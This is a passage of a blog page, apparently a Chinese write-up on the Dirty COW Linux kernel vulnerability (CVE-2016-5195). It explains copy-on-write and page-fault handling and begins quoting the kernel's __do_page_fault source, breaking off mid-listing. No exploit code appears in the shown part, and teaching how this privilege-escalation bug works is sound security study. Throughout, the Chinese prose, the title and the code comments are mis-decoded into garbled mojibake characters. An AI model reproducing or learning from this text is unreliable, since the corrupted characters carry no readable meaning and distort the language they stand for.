<!DOCTYPE html>
<html lang="zh-CN" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="keywords" content="" />
  <meta name="author" content="arttnba3" />
  <meta name="description" content="ã‚ãŒã„ãŸå¤¢ã‚’æ¨ã¦ã¦æºã‚Œã‚‹ä»Šæ—¥ã¯çœ ã£ã¦èª¤é­”åŒ–ã›" />
  
  
  <title>
    
      ã€CVE.0x00ã€‘CVE-2016-5195 â€œè„ç‰›â€æ¼æ´å¤ç°åŠç®€è¦åˆ†æ 
      
      
      |
    
     arttnba3&#39;s blog
  </title>

  
    <link rel="apple-touch-icon" href="/img/favicon.png">
    <link rel="icon" href="/img/favicon.png">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  
<link rel="stylesheet" href="/css/color-scheme.css">
<link rel="stylesheet" href="/css/base.css">
<link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css">
<link rel="stylesheet" href="/css/github-markdown.css">
<link rel="stylesheet" href="/css/highlight.css">
<link rel="stylesheet" href="/css/comments.css">

  <!-- ä»£ç å—é£æ ¼ -->
  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
  
  
<script src="/js/fancybox.js"></script>


  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="arttnba3's blog" type="application/atom+xml">
</head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a target="_blank" rel="noopener" href="https://arttnba3.cn">
      <!-- å¤´åƒå–æ¶ˆæ‡’åŠ è½½ï¼Œæ·»åŠ no-lazy -->
      
        <img src="/img/avatar.png" alt="">
      
    </a>
    <div class="nickname"><a target="_blank" rel="noopener" href="https://arttnba3.cn">arttnba3's blog</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Home</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/categories/">
          <a href="/categories/">Categories</a>
        </li>
      
        <li class="nav-item" data-path="/tags/">
          <a href="/tags/">Tags</a>
        </li>
      
        <li class="nav-item" data-path="/friends/">
          <a href="/friends/">Friends</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- æ–‡ç« è¯¦æƒ…é¡µï¼Œå±•ç¤ºæ–‡ç« å…·ä½“å†…å®¹ï¼Œurlå½¢å¼ï¼šhttps://yoursite/æ–‡ç« æ ‡é¢˜/ -->
<!-- åŒæ—¶ä¸ºã€Œæ ‡ç­¾tagã€ï¼Œã€Œæœ‹å‹friendã€ï¼Œã€Œåˆ†ç±»categoriesã€ï¼Œã€Œå…³äºaboutã€é¡µé¢çš„æ‰¿è½½é¡µé¢ï¼Œå…·ä½“å±•ç¤ºå–å†³äºpage.type -->


  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
  
  
<script src="/js/codeCopy.js"></script>







  

  

  

  
  <!-- æ–‡ç« å†…å®¹é¡µ urlå½¢å¼ï¼šhttps://yoursite/æ–‡ç« æ ‡é¢˜/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">ã€CVE.0x00ã€‘CVE-2016-5195 â€œè„ç‰›â€æ¼æ´å¤ç°åŠç®€è¦åˆ†æ</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime" title="æ›´æ–°æ—¶é—´"></i>
          2021-04-08 23:36:27
        </span>
        
              <span class="post-categories">
                <i class="iconfont icon-bookmark" title="åˆ†ç±»"></i>
                
                <span class="span--category">
                  <a href="/categories/CVE/" title="CVE">
                    <b>#</b> CVE
                  </a>
                </span>
                
              </span>
          
              <span class="post-tags">
                <i class="iconfont icon-tags" title="æ ‡ç­¾"></i>
                
                <span class="span--tag">
                  <a href="/tags/Pwn/" title="Pwn">
                    <b>#</b> Pwn
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/CVE/" title="CVE">
                    <b>#</b> CVE
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/Linux/" title="Linux">
                    <b>#</b> Linux
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/%E6%8F%90%E6%9D%83/" title="ææƒ">
                    <b>#</b> ææƒ
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/Linux-Kernel/" title="Linux Kernel">
                    <b>#</b> Linux Kernel
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/%E8%84%8F%E7%89%9B/" title="è„ç‰›">
                    <b>#</b> è„ç‰›
                  </a>
                </span>
                
              </span>
          
      </div>
      <div class="markdown-body">
        <p>å¿«ç»™ä½ çš„ğŸ‚æ´—æ´—æ¾¡å§~</p>
<span id="more"></span>

<h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p><strong>CVE-2016-5195</strong> å³ <code>dirtyCOW</code> ï¼Œä¿—ç§°ã€Œè„ç‰›ã€æ¼æ´ï¼Œæ˜¯ Linux Kernel ä¸­çš„æ¡ä»¶ç«äº‰æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ Linux kernel ä¸­çš„ COWï¼ˆCopy-on-Writeï¼‰æŠ€æœ¯ä¸­å­˜åœ¨çš„é€»è¾‘æ¼æ´å®Œæˆå¯¹æ–‡ä»¶çš„è¶Šæƒè¯»å†™</p>
<p>è„ç‰›æ¼æ´å‡ ä¹æ¶µç›–äº†æ‰€æœ‰ä¸»æµçš„ Linux å‘è¡Œç‰ˆï¼ŒåŒæ—¶ä¹Ÿæ˜¯ä¸€ä¸ªç”±Linusæœ¬äººäº²æ‰‹ä¿®å¤çš„æ¼æ´</p>
<blockquote>
<p>ç¬”è€…æœ¬äººå°è¯•å¤ç°çš„ç¬¬ä¸€ä¸ª kernel æ–¹å‘çš„ cve ï¼Œä¸ç¦æ„Ÿå¹è‡ªå·±ä¼šçš„è¿˜æ˜¯å¤ªå°‘â€¦</p>
</blockquote>
<blockquote>
<p>æœ¬ç¯‡æ–‡ç« ä¸­è´´å‡ºçš„å†…æ ¸æºç ä¸»è¦å…³æ³¨ç¬”è€…å†™ä¸Šä¸­æ–‡æ³¨é‡Šçš„éƒ¨åˆ†å³å¯</p>
</blockquote>
<h2 id="ä¸€ã€å†™æ—¶å¤åˆ¶æœºåˆ¶ï¼ˆCopy-on-Writeï¼‰"><a href="#ä¸€ã€å†™æ—¶å¤åˆ¶æœºåˆ¶ï¼ˆCopy-on-Writeï¼‰" class="headerlink" title="ä¸€ã€å†™æ—¶å¤åˆ¶æœºåˆ¶ï¼ˆCopy-on-Writeï¼‰"></a>ä¸€ã€å†™æ—¶å¤åˆ¶æœºåˆ¶ï¼ˆCopy-on-Writeï¼‰</h2><p>è¦æƒ³è¯´æ¸…æ¥šä»€ä¹ˆæ˜¯ <code>dirtyCOW</code> ï¼Œé¦–å…ˆå¾—å…ˆæŠŠä»€ä¹ˆæ˜¯ <code>COW</code> ç»™å¼„æ˜ç™½ï¼Œè¿™é‡Œæˆ‘ä»¬å…ˆä»æ•™ç§‘ä¹¦ä¸Šè®²çš„å¸¸è§„çš„ COW å…¥æ‰‹</p>
<h3 id="basic-COW"><a href="#basic-COW" class="headerlink" title="basic COW"></a>basic COW</h3><p>COW å³ <code>Copy On Write</code>â€”â€”<strong>ã€Œå†™æ—¶å¤åˆ¶ã€</strong>ï¼šä¸ºäº†å‡å°‘ç³»ç»Ÿçš„å¼€é”€ï¼Œåœ¨ä¸€ä¸ªè¿›ç¨‹é€šè¿‡ <code>fork()</code> ç³»ç»Ÿè°ƒç”¨åˆ›å»ºå­è¿›ç¨‹æ—¶ï¼Œå¹¶ä¸ä¼šç›´æ¥å°†æ•´ä¸ªçˆ¶è¿›ç¨‹åœ°å€ç©ºé—´çš„æ‰€æœ‰å†…å®¹éƒ½å¤åˆ¶ä¸€ä»½åå†åˆ†é…ç»™å­è¿›ç¨‹ï¼ˆè™½ç„¶ç¬¬ä¸€ä»£ UNIX ç³»ç»Ÿçš„ç¡®é‡‡ç”¨äº†è¿™ç§éå¸¸è€—æ—¶çš„åšæ³•ï¼‰ï¼Œè€Œæ˜¯åŸºäºä¸€ç§æ›´ä¸ºé«˜æ•ˆçš„æ€æƒ³ï¼š</p>
<p><strong>ã€Œçˆ¶è¿›ç¨‹ä¸å­è¿›ç¨‹å…±äº«æ‰€æœ‰çš„é¡µæ¡†ã€è€Œä¸æ˜¯ç›´æ¥ä¸ºå­è¿›ç¨‹åˆ†é…æ–°çš„é¡µæ¡†ï¼Œã€Œåªæœ‰å½“ä»»æ„ä¸€æ–¹å°è¯•ä¿®æ”¹æŸä¸ªé¡µæ¡†ã€çš„å†…å®¹æ—¶å†…æ ¸æ‰ä¼šä¸ºå…¶åˆ†é…ä¸€ä¸ªæ–°çš„é¡µæ¡†ï¼Œå¹¶å°†åŸé¡µæ¡†ä¸­å†…å®¹è¿›è¡Œå¤åˆ¶</strong></p>
<ul>
<li>åœ¨ <code>fork()</code> ç³»ç»Ÿè°ƒç”¨ä¹‹åï¼Œçˆ¶å­è¿›ç¨‹å…±äº«æ‰€æœ‰çš„é¡µæ¡†ï¼Œå†…æ ¸ä¼šå°†è¿™äº›é¡µæ¡†<strong>å…¨éƒ¨æ ‡ä¸ºread-only</strong></li>
<li>ç”±äºæ‰€æœ‰é¡µæ¡†è¢«æ ‡ä¸º<strong>åªè¯»</strong>ï¼Œå½“ä»»æ„ä¸€æ–¹å°è¯•ä¿®æ”¹æŸä¸ªé¡µæ¡†æ—¶ï¼Œä¾¿ä¼šè§¦å‘<strong>ã€Œç¼ºé¡µå¼‚å¸¸ã€</strong>ï¼ˆpage faultï¼‰â€”â€”æ­¤æ—¶å†…æ ¸æ‰ä¼šä¸ºå…¶åˆ†é…ä¸€ä¸ªæ–°çš„é¡µæ¡†</li>
</ul>
<p>å¤§è‡´è¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://i.loli.net/2021/04/12/5mcfXUIkLKtx3Zb.png" alt="87BE6D2465D0C5621CA7C96D4E23860A.png"></p>
<p><img src="https://i.loli.net/2021/04/12/imwksGXKjo2dlCA.png" alt="9D5CF91BA873C5AEC5A4E6CDE75FF6C5.png"></p>
<p><img src="https://i.loli.net/2021/04/12/e7Y9HCJjIm4suAk.png" alt="FD5A70A4D50C2B733ED19AB5E5B83B3B.png"></p>
<p>è¿™ä¾¿æ˜¯ã€Œå†™æ—¶å¤åˆ¶ã€çš„å¤§ä½“æµç¨‹â€”â€”åªæœ‰å½“æŸä¸ªè¿›ç¨‹å°è¯•ä¿®æ”¹å…±äº«å†…å­˜æ—¶ï¼Œå†…æ ¸æ‰ä¼šä¸ºå…¶åˆ†é…æ–°çš„é¡µæ¡†ï¼Œä»¥æ­¤å¤§å¹…åº¦å‡å°‘ç³»ç»Ÿçš„å¼€é”€ï¼Œè¾¾åˆ°æ€§èƒ½ä¼˜åŒ–çš„æ•ˆæœ</p>
<h3 id="mmap-ä¸-COW"><a href="#mmap-ä¸-COW" class="headerlink" title="mmap ä¸ COW"></a>mmap ä¸ COW</h3><p>åŒæ ·åœ°ï¼Œè‹¥æ˜¯æˆ‘ä»¬ä½¿ç”¨ mmap æ˜ å°„äº†ä¸€ä¸ªåªå…·æœ‰è¯»æƒé™è€Œä¸å…·æœ‰å†™æƒé™çš„æ–‡ä»¶ï¼Œå½“æˆ‘ä»¬å°è¯•å‘ mmap æ˜ å°„åŒºåŸŸå†™å…¥å†…å®¹æ—¶ï¼Œä¹Ÿä¼šè§¦å‘å†™æ—¶å¤åˆ¶æœºåˆ¶ï¼Œå°†è¯¥æ–‡ä»¶å†…å®¹æ‹·è´ä¸€ä»½åˆ°å†…å­˜ä¸­ï¼Œæ­¤æ—¶è¿›ç¨‹å¯¹è¿™å—åŒºåŸŸçš„è¯»å†™æ“ä½œä¾¿ä¸ä¼šå½±å“åˆ°ç¡¬ç›˜ä¸Šçš„æ–‡ä»¶</p>
<h2 id="äºŒã€ç¼ºé¡µå¼‚å¸¸ï¼ˆpage-faultï¼‰"><a href="#äºŒã€ç¼ºé¡µå¼‚å¸¸ï¼ˆpage-faultï¼‰" class="headerlink" title="äºŒã€ç¼ºé¡µå¼‚å¸¸ï¼ˆpage faultï¼‰"></a>äºŒã€ç¼ºé¡µå¼‚å¸¸ï¼ˆpage faultï¼‰</h2><p>åœ¨ CPU ä¸­ä½¿ç”¨ <strong>MMU</strong>ï¼ˆMemory Management Unitï¼Œå†…å­˜ç®¡ç†å•å…ƒï¼‰è¿›è¡Œè™šæ‹Ÿå†…å­˜ä¸ç‰©ç†å†…å­˜é—´çš„æ˜ å°„ï¼Œè€Œåœ¨ç³»ç»Ÿä¸­<strong>å¹¶éæ‰€æœ‰çš„è™šæ‹Ÿå†…å­˜é¡µéƒ½æœ‰ç€å¯¹åº”çš„ç‰©ç†å†…å­˜é¡µ</strong>ï¼Œ å½“è½¯ä»¶è¯•å›¾è®¿é—®å·²æ˜ å°„åœ¨è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­ï¼Œä½†æ˜¯<strong>å¹¶æœªè¢«åŠ è½½åœ¨ç‰©ç†å†…å­˜</strong>ä¸­çš„ä¸€ä¸ªåˆ†é¡µæ—¶ï¼ŒMMU æ— æ³•å®Œæˆç”±è™šæ‹Ÿå†…å­˜åˆ°ç‰©ç†å†…å­˜é—´çš„è½¬æ¢ï¼Œæ­¤æ—¶ä¾¿ä¼šäº§ç”Ÿ<strong>ã€Œç¼ºé¡µå¼‚å¸¸ã€</strong>ï¼ˆpage faultï¼‰</p>
<p>å¯èƒ½å‡ºç°ç¼ºé¡µå¼‚å¸¸çš„æƒ…å†µå¦‚ä¸‹ï¼š</p>
<ul>
<li>çº¿æ€§åœ°å€ä¸åœ¨è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­</li>
<li>çº¿æ€§åœ°å€åœ¨è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­ï¼Œä½†æ²¡æœ‰è®¿é—®æƒé™</li>
<li>çº¿æ€§åœ°å€åœ¨è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­ï¼Œä½†æ²¡æœ‰ä¸ç‰©ç†åœ°å€é—´å»ºç«‹æ˜ å°„å…³ç³»</li>
</ul>
<p>è™½ç„¶è¢«å‘½åä¸º â€œfaultâ€ ï¼Œä½†æ˜¯ç¼ºé¡µå¼‚å¸¸çš„å‘ç”Ÿå¹¶ä¸ä¸€å®šä»£è¡¨å‡ºé”™</p>
<h3 id="åˆ†ç±»"><a href="#åˆ†ç±»" class="headerlink" title="åˆ†ç±»"></a>åˆ†ç±»</h3><h4 id="â‘ è½¯æ€§ç¼ºé¡µå¼‚å¸¸ï¼ˆsoft-page-faultï¼‰"><a href="#â‘ è½¯æ€§ç¼ºé¡µå¼‚å¸¸ï¼ˆsoft-page-faultï¼‰" class="headerlink" title="â‘ è½¯æ€§ç¼ºé¡µå¼‚å¸¸ï¼ˆsoft page faultï¼‰"></a>â‘ è½¯æ€§ç¼ºé¡µå¼‚å¸¸ï¼ˆsoft page faultï¼‰</h4><p>è½¯æ€§ç¼ºé¡µå¼‚å¸¸æ„å‘³ç€<strong>ç›¸å…³çš„é¡µå·²ç»è¢«è½½å…¥å†…å­˜ä¸­</strong>ï¼Œä½†æ˜¯å¹¶æœªå‘ MMU è¿›è¡Œæ³¨å†Œï¼Œæ­¤æ—¶å†…æ ¸åªéœ€è¦åœ¨ MMU ä¸­æ³¨å†Œç›¸å…³é¡µå¯¹åº”çš„ç‰©ç†é¡µå³å¯</p>
<p>å¯èƒ½å‡ºç°è½¯æ€§ç¼ºé¡µå¼‚å¸¸çš„æƒ…å†µå¦‚ä¸‹ï¼š</p>
<ul>
<li>ä¸¤ä¸ªè¿›ç¨‹é—´å…±äº«ç›¸åŒçš„ç‰©ç†é¡µæ¡†ï¼Œæ“ä½œç³»ç»Ÿä¸ºå…¶ä¸­ä¸€ä¸ªè£…è½½å¹¶æ³¨å†Œäº†ç›¸åº”çš„é¡µï¼Œä½†æ˜¯æ²¡æœ‰ä¸ºå¦ä¸€ä¸ªè¿›ç¨‹æ³¨å†Œ</li>
<li>è¯¥é¡µå·²è¢«ä» CPU çš„å·¥ä½œé›†ï¼ˆ<strong>åœ¨æŸæ®µæ—¶é—´é—´éš” âˆ† é‡Œï¼Œè¿›ç¨‹å®é™…è¦è®¿é—®çš„é¡µé¢çš„é›†åˆ</strong>ï¼Œä¸ºæé«˜æ€§èƒ½ï¼Œåªæœ‰ç»å¸¸è¢«ä½¿ç”¨çš„é¡µæ‰èƒ½é©»ç•™åœ¨å·¥ä½œé›†ä¸­ï¼Œè€Œé•¿æœŸä¸ç”¨çš„é¡µåˆ™ä¼šè¢«ä»å·¥ä½œé›†ä¸­ç§»é™¤ï¼‰ä¸­ç§»é™¤ï¼Œä½†æ˜¯å°šæœªè¢«äº¤æ¢åˆ°ç£ç›˜ä¸Šï¼›è‹¥æ˜¯ç¨‹åºé‡æ–°éœ€è¦ä½¿ç”¨è¯¥é¡µå†…å®¹ï¼ŒCPU åªéœ€è¦å‘ MMU é‡æ–°æ³¨å†Œè¯¥é¡µå³å¯</li>
</ul>
<h4 id="â‘¡ç¡¬æ€§ç¼ºé¡µå¼‚å¸¸ï¼ˆhard-page-faultï¼‰"><a href="#â‘¡ç¡¬æ€§ç¼ºé¡µå¼‚å¸¸ï¼ˆhard-page-faultï¼‰" class="headerlink" title="â‘¡ç¡¬æ€§ç¼ºé¡µå¼‚å¸¸ï¼ˆhard page faultï¼‰"></a>â‘¡ç¡¬æ€§ç¼ºé¡µå¼‚å¸¸ï¼ˆhard page faultï¼‰</h4><p>ç¡¬æ€§ç¼ºé¡µå¼‚å¸¸æ„å‘³ç€<strong>ç›¸å…³çš„é¡µæœªç»è¢«è½½å…¥å†…å­˜ä¸­</strong>ï¼Œæ­¤æ—¶æ“ä½œç³»ç»Ÿä¾¿éœ€è¦<code>å¯»æ‰¾åˆ°ä¸€ä¸ªåˆé€‚ä¸”ç©ºé—²çš„ç‰©ç†é¡µ/å°†å¦ä¸€ä¸ªä½¿ç”¨ä¸­çš„é¡µå†™åˆ°ç¡¬ç›˜ä¸Š</code>ï¼Œéšåå‘è¯¥ç‰©ç†é¡µå†…å†™å…¥ç›¸åº”å†…å®¹ï¼Œå¹¶åœ¨ MMU ä¸­æ³¨å†Œè¯¥é¡µ</p>
<p>ç¡¬æ€§ç¼ºé¡µå¼‚å¸¸çš„å¼€é”€æå¤§ï¼Œå› æ­¤éƒ¨åˆ†æ“ä½œç³»ç»Ÿä¹Ÿä¼šé‡‡å–å»¶è¿Ÿé¡µè½½å…¥çš„ç­–ç•¥â€”â€”åªæœ‰åˆ°ä¸‡ä¸å¾—å·²æ—¶æ‰ä¼šåˆ†é…æ–°çš„ç‰©ç†é¡µï¼Œè¿™ä¹Ÿæ˜¯ Linux å†…æ ¸çš„åšæ³•</p>
<p>è‹¥æ˜¯é¢‘ç¹åœ°å‘ç”Ÿç¡¬æ€§ç¼ºé¡µå¼‚å¸¸åˆ™ä¼šå¼•å‘<strong>ç³»ç»Ÿé¢ ç°¸</strong>ï¼ˆsystem thrashingï¼Œæœ‰çš„ä¹¦ä¸Šä¹Ÿå«ç³»ç»ŸæŠ–åŠ¨ï¼‰â€”â€”å› èµ„æºè€—å°½è€Œæ— æ³•æ­£å¸¸å®Œæˆå·¥ä½œ</p>
<h4 id="â‘¢æ— æ•ˆç¼ºé¡µå¼‚å¸¸ï¼ˆinvalid-page-faultï¼‰"><a href="#â‘¢æ— æ•ˆç¼ºé¡µå¼‚å¸¸ï¼ˆinvalid-page-faultï¼‰" class="headerlink" title="â‘¢æ— æ•ˆç¼ºé¡µå¼‚å¸¸ï¼ˆinvalid page faultï¼‰"></a>â‘¢æ— æ•ˆç¼ºé¡µå¼‚å¸¸ï¼ˆinvalid page faultï¼‰</h4><p>æ— æ•ˆç¼ºé¡µå¼‚å¸¸æ„å‘³ç€ç¨‹åºè®¿é—®äº†ä¸€ä¸ªæ— æ•ˆçš„å†…å­˜åœ°å€ï¼ˆå†…å­˜åœ°å€ä¸å­˜åœ¨äºè¿›ç¨‹åœ°å€ç©ºé—´ï¼‰ï¼Œåœ¨ Linux ä¸‹å†…æ ¸ä¼šå‘è¿›ç¨‹å‘é€ <code>SIGSEGV</code> ä¿¡å·</p>
<h3 id="å¤„ç†ç¼ºé¡µå¼‚å¸¸"><a href="#å¤„ç†ç¼ºé¡µå¼‚å¸¸" class="headerlink" title="å¤„ç†ç¼ºé¡µå¼‚å¸¸"></a>å¤„ç†ç¼ºé¡µå¼‚å¸¸</h3><p>ç”±äºæœ¬ç¯‡æ‰€åˆ†æçš„æ¼æ´å­˜åœ¨äºè€ç‰ˆæœ¬çš„ Linux kernelï¼Œæ•…æˆ‘ä»¬ç®€è¦åˆ†æç›¸åº”ç‰ˆæœ¬å†…æ ¸ï¼ˆç¬”è€…é€‰æ‹©äº† v4.4ï¼‰ä¸­è¯¥å‡½æ•°çš„é€»è¾‘</p>
<p>åœ¨æ¥ä¸‹æ¥çš„åˆ†æè¿‡ç¨‹ä¸­æ‰€æ¶‰åŠåˆ°çš„åœ°å€å¦‚æ— è¯´æ˜çš†ä¸ºã€çº¿æ€§åœ°å€ã€‘</p>
<p>ä»…é’ˆå¯¹<strong>ã€Œæ–‡ä»¶æ˜ å°„ç¼ºé¡µå¼‚å¸¸ã€</strong>è€Œè¨€ï¼Œå¤§è‡´çš„æµç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼šï¼ˆå­—æ¯”è¾ƒä¸‘è§è°…qwq</p>
<p><img src="https://i.loli.net/2021/04/12/KYlk3gy8tZnVXmP.png" alt="4586A60AB93248CD8618EEFEC8260941.png"></p>
<h4 id="é¢„å¤„ç†ï¼š-do-page-fault"><a href="#é¢„å¤„ç†ï¼š-do-page-fault" class="headerlink" title="é¢„å¤„ç†ï¼š__do_page_fault()"></a>é¢„å¤„ç†ï¼š__do_page_fault()</h4><p>å…ˆæ¥çœ‹å¤„ç†ç¼ºé¡µå¼‚å¸¸çš„é¡¶å±‚å‡½æ•°<code>__do_page_fault ()</code>ï¼Œè¯¥å‡½æ•°ä½äºå†…æ ¸æºç ä¸­çš„ <code>arch/x86/mm/fault.c</code> ä¸­ï¼Œä»£ç é€»è¾‘å¦‚ä¸‹ï¼š</p>
<blockquote>
<p>æ³¨ï¼šæ‰¾å¯»æŸä¸ªå‡½æ•°äºå†…æ ¸æºç ä¸­çš„ä½ç½®å¯ä»¥ä½¿ç”¨<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/">https://elixir.bootlin.com/</a></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> noinline <span class="type">void</span></span><br><span class="line">__do_page_fault(<span class="keyword">struct</span> pt_regs *regs, <span class="type">unsigned</span> <span class="type">long</span> error_code,</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">long</span> address)<span class="comment">//regsï¼šå¯„å­˜å™¨ä¿¡æ¯ï¼›error_codeï¼šå¼‚å¸¸ä»£ç ï¼ˆä¸‰bitï¼‰ï¼›addressï¼šè¯·æ±‚çš„ã€çº¿æ€§åœ°å€ã€‘ï¼ˆè™šæ‹Ÿåœ°å€è½¬æ¢åˆ°ç‰©ç†åœ°å€ä¹‹é—´çš„ä¸­é—´é‡ï¼‰</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> 